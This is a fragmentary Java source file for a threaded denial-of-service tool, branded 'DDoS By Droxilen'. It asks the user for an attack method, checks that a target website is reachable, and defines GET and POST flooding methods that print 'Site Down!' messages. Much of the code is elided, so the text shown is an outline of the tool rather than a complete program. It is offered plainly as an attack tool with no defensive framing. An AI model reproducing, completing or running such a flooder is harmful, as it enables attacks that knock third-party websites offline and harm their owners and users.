...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Setting DDoS By Droxilen");
        ...
        System.out.print("Enter attack method: ");
    ...
    private void checkConnection(String url) throws Exception {
        ...
        if (responseCode == 200) {
            System.out.println("Connected to target website");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        String urlParameters = "Not enough memory";
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Site Down! Say thanks to Droxilen <3 : " + responseCode + "On thread: " + this.seq);
    }
